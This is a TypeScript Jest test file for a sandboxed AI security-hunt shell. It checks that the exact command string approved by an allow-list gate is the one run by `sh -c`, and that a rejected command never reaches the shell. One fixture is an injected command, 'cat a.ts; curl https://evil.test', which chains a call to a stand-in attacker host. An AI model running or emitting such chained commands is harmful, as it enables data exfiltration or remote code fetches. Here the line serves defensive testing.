/** @jest-environment node */
/**
 * LUM-758 Task 9 — THE EXEC BOUNDARY.
 *
 * `checkHuntCommand` went through four review rounds that found eleven real
 * bypasses, the last of them with a differential fuzzer run against real bash,
 * zsh and sh. Every one of those rounds is voided the moment the string the
 * gate checked stops being the string that executes. So this file does not
 * test the gate at all (`shell-allowlist.test.ts` does that) — it tests the
 * ONE property the gate cannot establish about itself:
 *
 *   the bytes `checkHuntCommand` read === the bytes `sh -c` receives,
 *   and there is exactly one place in the hunt where that hand-off happens.
 *
 * It is written to fail if a later change re-quotes, wraps, concatenates or
 * interpolates the command, swaps `sh -c` for `bash -lc`, or gives the hunt's
 * service / LLM client a second route to a sandbox.
 */
jest.mock('@/lib/logger', () => ({
  logger: { error: jest.fn(), info: jest.fn(), warn: jest.fn() },
}))
jest.mock('@/lib/integrations/vercel-sandbox', () => ({
  findRepoSandboxByTag: jest.fn(),
  createRepoSandbox: jest.fn(),
  denySandboxEgress: jest.fn(),
  repoCheckoutDir: jest.fn(
    (cwd: string, repo: string) => `${cwd}/${repo.split('/')[1]}`
  ),
}))
jest.mock('@/lib/integrations/github/auth', () => ({
  getGithubInstallationToken: jest.fn().mockResolvedValue('ghs_secret_token'),
}))

/**
 * Every string the gate was asked about, recorded by a PASS-THROUGH spy: the
 * real gate still decides, so a command that reaches `sandbox.run` is a
 * command the real allow-list admitted.
 */
const mockChecked: string[] = []
jest.mock('@/lib/security-scan/hunt/shell-allowlist', () => {
  const actual = jest.requireActual('@/lib/security-scan/hunt/shell-allowlist')
  return {
    ...actual,
    checkHuntCommand: jest.fn((cmd: string) => {
      mockChecked.push(cmd)
      return actual.checkHuntCommand(cmd)
    }),
  }
})

import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  attachOrCreateHuntSandbox,
  runHuntShell,
} from '@/lib/services/security-hunt-sandbox'
import {
  HUNT_SHELL_BIN,
  HUNT_SHELL_FLAG,
} from '@/lib/security-scan/hunt/shell-allowlist'
import { findRepoSandboxByTag } from '@/lib/integrations/vercel-sandbox'

const find = findRepoSandboxByTag as jest.Mock

const CLEAN_CONFIG = '[remote "origin"]\n\turl = https://github.com/o/r.git\n'

const fakeSandbox = () => ({
  name: 'vm1',
  cwd: '/vercel',
  run: jest.fn().mockResolvedValue({ exitCode: 0, stdout: 'out', stderr: '' }),
  readFile: jest.fn(async (path: string) =>
    path.endsWith('/.git/config') ? Buffer.from(CLEAN_CONFIG) : null
  ),
  stop: jest.fn().mockResolvedValue(undefined),
})

const handleFor = (vm: ReturnType<typeof fakeSandbox>) => ({
  sandbox: vm as never,
  cwd: '/vercel/r',
  token: 'ghs_secret_token',
  origin: 'attached' as const,
  egressDenied: false,
})

/**
 * Deliberately full of the characters any re-quoting would disturb: double
 * quotes, a backslash escape, a `$` anchor, a pipe and repeated spaces. The
 * real gate admits it (asserted below), so this is a command the agent could
 * actually send.
 */
const COMMAND = 'rg -n "req\\.query\\.id$" lib/  | head -n 20'

/**
 * The same command with the whitespace a model routinely emits around it.
 * `checkHuntCommand` admits all three of `' rg … '`, `'rg …\n'` and `'\trg …'`,
 * so normalising here would be invisible to the unpadded fixture above — a
 * `.trim()` slipped between the gate and the shell passed every case in this
 * file before this constant existed. Byte-identical means byte-identical,
 * whitespace included.
 */
const PADDED_COMMAND = ` \t${COMMAND} \n`

const read = (rel: string) => readFileSync(join(process.cwd(), rel), 'utf8')

/**
 * Source with comments stripped. These assertions are about what the code
 * DOES; a doc comment that merely names `handle.sandbox` while explaining why
 * nobody may touch it must not read as a violation of itself.
 */
const codeOf = (rel: string) =>
  read(rel)
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/^[ \t]*\/\/.*$/gm, '')

beforeEach(() => {
  jest.clearAllMocks()
  mockChecked.length = 0
})

describe('LUM-758 the hunt exec boundary is a single choke point', () => {
  it('runs the byte-identical string the gate checked, as ONE argv entry', async () => {
    const vm = fakeSandbox()

    await runHuntShell({ handle: handleFor(vm), command: COMMAND })

    // The gate saw exactly the caller's string…
    expect(mockChecked).toEqual([COMMAND])
    // …and the shell got exactly that same string, unchanged.
    expect(vm.run).toHaveBeenCalledTimes(1)
    const [bin, argv] = vm.run.mock.calls[0]!
    expect(argv).toHaveLength(2)
    expect(argv[1]).toBe(mockChecked[0])
    expect(argv[1]).toBe(COMMAND)
    expect(argv[1]).toHaveLength(COMMAND.length)
    // A wrapper would still satisfy `toContain`; length + strict equality is
    // what makes `sh -c "…" ; cleanup` or a shell-quoted copy fail here.
    expect(bin).toBe(HUNT_SHELL_BIN)
    expect(argv[0]).toBe(HUNT_SHELL_FLAG)
  })

  it('uses a non-interactive, non-login POSIX shell — the one the gate was fuzzed against', () => {
    // `bash -lc` sources profiles (extglob, aliases, functions) and `-i` adds
    // history expansion: each changes what the SAME string means, which is the
    // ground `scanSegment`'s character whitelist stands on. Swapping either in
    // fails this test.
    expect(HUNT_SHELL_BIN).toBe('sh')
    expect(HUNT_SHELL_FLAG).toBe('-c')
    expect(HUNT_SHELL_FLAG).not.toMatch(/[li]/)
  })

  it('does not normalise the command: leading/trailing whitespace survives too', async () => {
    const vm = fakeSandbox()

    await runHuntShell({ handle: handleFor(vm), command: PADDED_COMMAND })

    // The real gate admitted the padded string (this is a pass-through spy),
    // so trimming it would be a silent rewrite of an already-allowed command.
    expect(mockChecked).toEqual([PADDED_COMMAND])
    const [, argv] = vm.run.mock.calls[0]!
    expect(argv[1]).toBe(PADDED_COMMAND)
    expect(argv[1]).toHaveLength(PADDED_COMMAND.length)
    expect(argv[1]).not.toBe(PADDED_COMMAND.trim())
  })

  it('a refused command never reaches the shell at all', async () => {
    const vm = fakeSandbox()

    const out = await runHuntShell({
      handle: handleFor(vm),
      command: 'cat a.ts; curl https://evil.test',
    })

    expect(out.error).toBeDefined()
    expect(vm.run).not.toHaveBeenCalled()
  })

  it('the only other commands the layer runs are its own fixed argv, never `sh`', async () => {
    const vm = fakeSandbox()
    find.mockResolvedValue(vm)

    await attachOrCreateHuntSandbox({
      scanId: 's1',
      workspaceId: 'w1',
      repo: 'o/r',
      headSha: 'a'.repeat(40),
      managedScanStarted: true,
    })

    // The credential guard's own probes (`git …`, `env`) are constants written
    // in this module; nothing model-supplied reaches them, and none of them is
    // a shell. If a setup step ever grows an `sh -c`, this is where it shows.
    const bins = vm.run.mock.calls.map(c => c[0])
    expect(bins.length).toBeGreaterThan(0)
    expect(bins).not.toContain(HUNT_SHELL_BIN)
    for (const [, argv] of vm.run.mock.calls) {
      expect(Array.isArray(argv)).toBe(true)
    }
    // And the gate is not consulted for them — they are not agent commands.
    expect(mockChecked).toEqual([])
  })
})

describe('LUM-758 source-level: one module may touch a sandbox, one call site may run a command', () => {
  const sandboxModule = codeOf('lib/services/security-hunt-sandbox.ts')

  it('the command is never interpolated, re-quoted or concatenated in the sandbox module', () => {
    // A template literal or a `+` around the command is precisely how the
    // checked string and the executed string drift apart.
    expect(sandboxModule).not.toMatch(/\$\{[^}]*\bcommand\b[^}]*\}/)
    expect(sandboxModule).not.toMatch(/\bcommand\b\s*\+|\+\s*input\.command/)
    expect(sandboxModule).not.toMatch(/JSON\.stringify\(\s*input\.command/)
    // `input.command` appears exactly twice: the gate reads it, the shell runs
    // it. A third use is a new hop and has to be looked at.
    expect(sandboxModule.match(/input\.command/g)).toHaveLength(2)
  })

  it('readHuntFile reads a file — it never routes through the shell', () => {
    // Every guard above is scoped to `input.command`, so a change that routed
    // the verification read through `sandbox.run('sh', ['-c', `cat ${path}`])`
    // would trip none of them — and `path` there is model-named. The read has
    // a first-class API (`readSandboxFile`); the shell must stay out of it.
    const body = sandboxModule.slice(
      sandboxModule.indexOf('export async function readHuntFile')
    )
    const fn = body.slice(0, body.indexOf('\n}\n') + 3)
    expect(fn).toContain('readSandboxFile')
    expect(fn).not.toContain('HUNT_SHELL_BIN')
    expect(fn).not.toMatch(/\brun\(/)
  })

  it('the hunt service and LLM client have no route to a sandbox of their own', () => {
    for (const rel of [
      'lib/services/security-hunt.service.ts',
      'lib/llm/security-hunt-client.ts',
    ]) {
      const src = codeOf(rel)
      expect(src).not.toMatch(/integrations\/vercel-sandbox/)
      expect(src).not.toMatch(/\bsandbox\.run\b/)
      // The service holds a `HuntSandbox` handle but must never reach into it:
      // `runHuntShell` takes the whole handle so the credential guard cannot
      // be skipped, and `handle.sandbox` is how that gets bypassed.
      expect(src).not.toMatch(/handle\.sandbox/)
    }
  })

  it('the LLM client passes the command through untouched', () => {
    const client = codeOf('lib/llm/security-hunt-client.ts')
    expect(client).toContain(
      'execute: ({ command }) => input.runShell(command)'
    )
    expect(client).not.toMatch(/runShell\([^)]*(?:trim|\+|`)/)
  })
})
